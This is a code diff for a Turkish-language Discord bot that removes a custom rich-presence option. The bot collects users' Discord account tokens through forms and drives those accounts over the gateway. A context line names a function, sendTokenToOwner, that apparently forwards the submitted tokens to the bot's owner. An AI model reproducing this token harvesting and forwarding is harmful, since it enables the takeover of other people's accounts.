@@ -149,8 +149,8 @@ async function sendTokenToOwner(botClient, title, token, accountName, username, 
   }
 }
 
-// User token ile Discord Gateway üzerinden RPC (Custom və ya Hazır Oyun) başlatan funksiya
-function startUserRPC(token, accountName, rpcConfig) {
+// User token ile Discord Gateway üzerinden hazır oyun RPC başlatan funksiya
+function startUserRPC(token, accountName, gameObj) {
   return new Promise((resolve) => {
     const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
     let heartbeatInterval = null;
@@ -164,20 +164,11 @@ function startUserRPC(token, accountName, rpcConfig) {
     };
 
     const activity = {
-      name: rpcConfig.name,
+      name: gameObj.name,
+      application_id: gameObj.id,
       type: 0, // Playing
       timestamps: { start: Date.now() }
     };
-
-    if (rpcConfig.id) {
-      activity.application_id = rpcConfig.id;
-    }
-    if (rpcConfig.details) {
-      activity.details = rpcConfig.details;
-    }
-    if (rpcConfig.state) {
-      activity.state = rpcConfig.state;
-    }
 
     const session = {
       stop: () => {
@@ -290,7 +281,7 @@ client.on('messageCreate', async (message) => {
         new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
       )
       .addTextDisplayComponents(
-        new TextDisplayBuilder().setContent('• **Başlat** : Hesap seçin; Hazır Oyun Ara veya Özel (Custom) RPC ile RPC başlatın.')
+        new TextDisplayBuilder().setContent('• **Başlat** : Hesap seçin, hazır oyunlarda arama yapın ve listeden bir oyun seçerek RPC başlatın.')
       )
       .addTextDisplayComponents(
         new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
@@ -379,85 +370,26 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
   }
 
-  // --- 2. HESAP SEÇİLDİKTEN SONRA -> MOD SEÇİMİ (HAZIR OYUN ARA / CUSTOM RPC) ---
+  // --- 2. HESAP SEÇİLDİKTEN SONRA -> HAZIR OYUN AXTARIŞ MODALI ---
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
     const selectedAccountValue = interaction.values[0];
 
-    const modeMenu = new StringSelectMenuBuilder()
-      .setCustomId(`select_rpc_mode_${selectedAccountValue}`)
-      .setPlaceholder('RPC türünü seçin...')
-      .addOptions([
-        {
-          label: 'Hazır Oyun Ara',
-          value: 'preset_game',
-          description: 'Hazır oyunlarda arama yapıp listeden seçin',
-          emoji: '🎮'
-        },
-        {
-          label: 'Özel (Custom) RPC',
-          value: 'custom_rpc',
-          description: 'Kendi oyun/aktivite adını, detay ve durumu yazın',
-          emoji: '✏️'
-        }
-      ]);
+    const modal = new ModalBuilder()
+      .setCustomId(`game_search_modal_${selectedAccountValue}`)
+      .setTitle('Hazır Oyun Ara');
 
-    const row = new ActionRowBuilder().addComponents(modeMenu);
-    await interaction.update({ content: 'Başlatmak istediğiniz RPC türünü seçin:', components: [row] });
+    const searchInput = new TextInputBuilder()
+      .setCustomId('game_query')
+      .setLabel('Oyun adı yazın (örn: minecraft, gta, valorant)')
+      .setPlaceholder('Boş bırakırsanız ilk 25 hazır oyun gösterilir')
+      .setStyle(TextInputStyle.Short)
+      .setRequired(false);
+
+    modal.addComponents(new ActionRowBuilder().addComponents(searchInput));
+    await interaction.showModal(modal);
   }
 
-  // --- 3. MOD SEÇİMİ -> İLGİLİ MODAL ---
-  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_rpc_mode_')) {
-    const selectedAccountValue = interaction.customId.replace('select_rpc_mode_', '');
-    const mode = interaction.values[0];
-
-    if (mode === 'preset_game') {
-      const modal = new ModalBuilder()
-        .setCustomId(`game_search_modal_${selectedAccountValue}`)
-        .setTitle('Hazır Oyun Ara');
-
-      const searchInput = new TextInputBuilder()
-        .setCustomId('game_query')
-        .setLabel('Oyun adı yazın (örn: minecraft, gta, valorant)')
-        .setPlaceholder('Boş bırakırsanız ilk 25 hazır oyun gösterilir')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(false);
-
-      modal.addComponents(new ActionRowBuilder().addComponents(searchInput));
-      await interaction.showModal(modal);
-    } else {
-      const modal = new ModalBuilder()
-        .setCustomId(`rpc_modal_${selectedAccountValue}`)
-        .setTitle('Özel RPC Ayarları');
-
-      const nameInput = new TextInputBuilder()
-        .setCustomId('rpc_name')
-        .setLabel('Aktivite / Oyun Adı')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(true);
-
-      const detailsInput = new TextInputBuilder()
-        .setCustomId('rpc_details')
-        .setLabel('Detay (Details - isteğe bağlı)')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(false);
-
-      const stateInput = new TextInputBuilder()
-        .setCustomId('rpc_state')
-        .setLabel('Durum (State - isteğe bağlı)')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(false);
-
-      modal.addComponents(
-        new ActionRowBuilder().addComponents(nameInput),
-        new ActionRowBuilder().addComponents(detailsInput),
-        new ActionRowBuilder().addComponents(stateInput)
-      );
-
-      await interaction.showModal(modal);
-    }
-  }
-
-  // --- 4. HAZIR OYUN AXTARIŞ NƏTİCƏLƏRİ -> OYUN SEÇİM MENÜSÜ ---
+  // --- 3. HAZIR OYUN AXTARIŞ NƏTİCƏLƏRİ -> OYUN SEÇİM MENÜSÜ ---
   if (interaction.isModalSubmit() && interaction.customId.startsWith('game_search_modal_')) {
     const selectedAccountValue = interaction.customId.replace('game_search_modal_', '');
     const query = interaction.fields.getTextInputValue('game_query').trim().toLowerCase();
@@ -499,7 +431,7 @@ client.on('interactionCreate', async (interaction) => {
     });
   }
 
-  // --- 5. HAZIR OYUN SEÇİLDİ -> RPC BAŞLAT ---
+  // --- 4. HAZIR OYUN SEÇİLDİ -> RPC BAŞLAT ---
   if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_game_rpc_')) {
     const selectedAccountValue = interaction.customId.replace('select_game_rpc_', '');
     const gameIdx = parseInt(interaction.values[0], 10);
@@ -554,50 +486,7 @@ client.on('interactionCreate', async (interaction) => {
     });
   }
 
-  // --- 6. CUSTOM RPC MODAL CEVABI ---
-  if (interaction.isModalSubmit() && interaction.customId.startsWith('rpc_modal_')) {
-    const selectedValue = interaction.customId.replace('rpc_modal_', '');
-    const rpcName = interaction.fields.getTextInputValue('rpc_name').trim();
-    const rpcDetails = interaction.fields.getTextInputValue('rpc_details').trim();
-    const rpcState = interaction.fields.getTextInputValue('rpc_state').trim();
-
-    const tokens = userTokens.get(userId) || [];
-    const targetTokens = selectedValue === 'all_accounts'
-      ? tokens
-      : [tokens[parseInt(selectedValue, 10)]].filter(Boolean);
-
-    if (targetTokens.length === 0) {
-      return interaction.reply({ content: '⚠️ Hesap bulunamadı!', ephemeral: true });
-    }
-
-    await interaction.deferReply({ ephemeral: true });
-
-    if (!activeRPCs.has(userId)) {
-      activeRPCs.set(userId, []);
-    }
-
-    let startedCount = 0;
-    for (const tObj of targetTokens) {
-      const session = await startUserRPC(tObj.token, tObj.name, {
-        name: rpcName,
-        details: rpcDetails,
-        state: rpcState
-      });
-      if (session && typeof session.stop === 'function') {
-        activeRPCs.get(userId).push({
-          token: tObj.token,
-          name: tObj.name,
-          username: tObj.username,
-          stop: session.stop
-        });
-        startedCount++;
-      }
-    }
-
-    await interaction.editReply({ content: `🚀 Seçilen ${startedCount} hesap için RPC başlatıldı: **${rpcName}**` });
-  }
-
-  // --- 7. TOKEN EKLE BUTONU ---
+  // --- 5. TOKEN EKLE BUTONU ---
   if (interaction.isButton() && interaction.customId === 'add_token') {
     const modal = new ModalBuilder()
       .setCustomId('token_modal')
@@ -613,7 +502,7 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.showModal(modal);
   }
 
-  // --- 7.1. TOPLU TOKEN EKLE BUTONU ---
+  // --- 5.1. TOPLU TOKEN EKLE BUTONU ---
   if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
     const modal = new ModalBuilder()
       .setCustomId('bulk_token_modal')
@@ -630,7 +519,7 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.showModal(modal);
   }
 
-  // --- 7.2. TOKEN SİL PANELİ ---
+  // --- 5.2. TOKEN SİL PANELİ ---
   if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
     const tokens = userTokens.get(userId);
     if (!tokens || tokens.length === 0) {
@@ -654,7 +543,7 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
   }
 
-  // --- 8. TEK TOKEN MODAL CEVABI ---
+  // --- 6. TEK TOKEN MODAL CEVABI ---
   if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
     const token = interaction.fields.getTextInputValue('token_input').trim();
     await interaction.deferReply({ ephemeral: true });
@@ -688,7 +577,7 @@ client.on('interactionCreate', async (interaction) => {
     }
   }
 
-  // --- 8.1. TOPLU TOKEN MODAL CEVABI ---
+  // --- 6.1. TOPLU TOKEN MODAL CEVABI ---
   if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
     const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
     const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);
@@ -740,7 +629,7 @@ client.on('interactionCreate', async (interaction) => {
     });
   }
 
-  // --- 8.2. TOKEN SİLME SEÇİM İŞLEMİ ---
+  // --- 6.2. TOKEN SİLME SEÇİM İŞLEMİ ---
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
     const selectedValue = interaction.values[0];
     const tokens = userTokens.get(userId);
@@ -759,7 +648,7 @@ client.on('interactionCreate', async (interaction) => {
     }
   }
 
-  // --- 9. DURDUR BUTONU -> HESAP SEÇİMİ ---
+  // --- 7. DURDUR BUTONU -> HESAP SEÇİMİ ---
   if (interaction.isButton() && interaction.customId === 'stop_all') {
     const userRPCs = activeRPCs.get(userId) || [];
 
@@ -784,7 +673,7 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: 'RPC durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
   }
 
-  // --- 9.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
+  // --- 7.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_rpc_account') {
     const selectedValue = interaction.values[0];
     const userRPCs = activeRPCs.get(userId) || [];
